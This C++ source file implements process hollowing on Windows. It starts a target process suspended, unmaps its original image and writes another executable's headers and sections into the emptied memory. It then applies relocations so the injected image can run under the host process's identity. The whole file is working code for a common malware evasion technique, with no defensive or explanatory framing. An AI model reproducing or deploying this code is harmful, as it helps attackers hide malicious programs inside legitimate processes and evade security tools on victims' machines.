#include "stdafx.h"
#include <processthreadsapi.h>
#include "pe.h"
HANDLE CreateHollowedProcess(LPSTR lpCommandLine, LPSTR lpSourceFile)
{
	cout << "-->Creating Process." << endl;
	//指定窗口工作站，桌面，标准句柄以及创建时进程主窗口的外观的结构体
	LPSTARTUPINFOA lpStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION lpProcessInformation = new PROCESS_INFORMATION();
	HANDLE hProcess;
	CreateProcessA(NULL, 
		lpCommandLine, 
		NULL,
		NULL, 
		NULL, 
		CREATE_SUSPENDED, 
		NULL, 
		NULL, 
		lpStartupInfo, 
		lpProcessInformation
	);
	hProcess = lpProcessInformation->hProcess;
	cout << lpProcessInformation->dwProcessId << endl;
	if (!hProcess)
	{
		cout << "-->Create Process Failed." << endl;
		return hProcess;
	}
	_PPEB pPEB = ReadRemotePEB(hProcess);
	//PLOADED_IMAGE pImage = ReadRemoteImage(hProcess,pPEB->lpImageBaseAddress);
	cout << "-->Opening source image." << endl;
	HANDLE hFile = CreateFileA(lpSourceFile, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		cout << "-->Open EXE File Filed." << endl;
		return hProcess;
	}
	DWORD dwSize = GetFileSize(hFile, 0);
	PBYTE pBuffer = new BYTE[dwSize];
	DWORD dwBytesRead = 0;
	ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, NULL);
	PLOADED_IMAGE pSourceImage = GetLoadedImage((ULONG_PTR)pBuffer);
	PIMAGE_NT_HEADERS pSourceHeader = pSourceImage->FileHeader;
	cout << "-->Unmapping Destination Section." << endl;
	HMODULE hNTDLL = GetModuleHandleA("ntdll");
	_NtUnmapViewOfSection NtUnmapViewSection = (_NtUnmapViewOfSection)GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
	DWORD dwResult = NtUnmapViewSection(lpProcessInformation->hProcess, pPEB->lpImageBaseAddress);
	if (dwResult)
	{
		cout << "-->Error Unmapping Section." << endl;
		return hProcess;
	}

	cout << "-->Allocating Memory." << endl;
	LPVOID pRemoteImage = VirtualAllocEx
	(
		lpProcessInformation->hProcess,
		pPEB->lpImageBaseAddress,
		pSourceHeader->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (!pRemoteImage)
	{
		cout << "-->Allocate Memory Failed." << endl;
		cout << "-->Error Code:" << GetLastError() << endl;
		return hProcess;
	}
	
	ULONG_PTR upDelta = (ULONG_PTR)pPEB->lpImageBaseAddress - pSourceHeader->OptionalHeader.ImageBase;
	cout << hex << "Source Image BaseAddress:" << pSourceHeader->OptionalHeader.ImageBase << endl;
	cout << hex << "Destination Image BaseAddress:" << pPEB->lpImageBaseAddress << endl;
	cout << hex << "Relocation Delat:" << upDelta << endl;

	pSourceHeader->OptionalHeader.ImageBase = (ULONG_PTR)pPEB->lpImageBaseAddress;
	cout << "-->Writing Headers" << endl;
	if (!WriteProcessMemory
	(
		lpProcessInformation->hProcess,
		pPEB->lpImageBaseAddress,
		pBuffer,
		pSourceHeader->OptionalHeader.SizeOfHeaders,
		NULL
	))
	{
		cout << "Writing Header Failed." << endl;
		return hProcess;
	}
	cout << "-->Writing Sections." << endl;
	//if (!CopySections(hProcess, (ULONG_PTR)pPEB->lpImageBaseAddress, (ULONG_PTR)pBuffer))
	//{
	//	cout << "Copy Secitons Failed." << endl;
	//	return hProcess;
	//}
	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination =
			(PVOID)((DWORD)pPEB->lpImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);


		if (!WriteProcessMemory
		(
			lpProcessInformation->hProcess,
			pSectionDestination,
			&pBuffer[pSourceImage->Sections[x].PointerToRawData],
			pSourceImage->Sections[x].SizeOfRawData,
			0
		))
		{
			cout << "Writing Memory Failed." << endl;
			return hProcess;
		}
	}

	if (upDelta)
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
			char* pSectionName = ".reloc";

			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;

			cout << "Rebase Image" << endl;

			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;

			IMAGE_DATA_DIRECTORY relocData =
				pSourceHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			while (dwOffset < relocData.Size)
			{
				PBASE_RELOCATION_BLOCK pBlockheader =
					(PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);

				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlocks =
					(PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

				for (DWORD y = 0; y < dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[y].Type == 0)
						continue;

					DWORD dwFieldAddress =
						pBlockheader->PageAddress + pBlocks[y].Offset;

					DWORD dwBuffer = 0;
					ReadProcessMemory
					(
						lpProcessInformation->hProcess,
						(PVOID)((DWORD)pPEB->lpImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);

					//printf("Relocating 0x%p -> 0x%p\r\n", dwBuffer, dwBuffer - dwDelta);

					dwBuffer += upDelta;

					BOOL bSuccess = WriteProcessMemory
					(
						lpProcessInformation->hProcess,
						(PVOID)((DWORD)pPEB->lpImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);

					if (!bSuccess)
					{
						cout << "Writing Memory Failed" << endl;
						continue;
					}
				}
			}

			break;
		}
	return hProcess;
}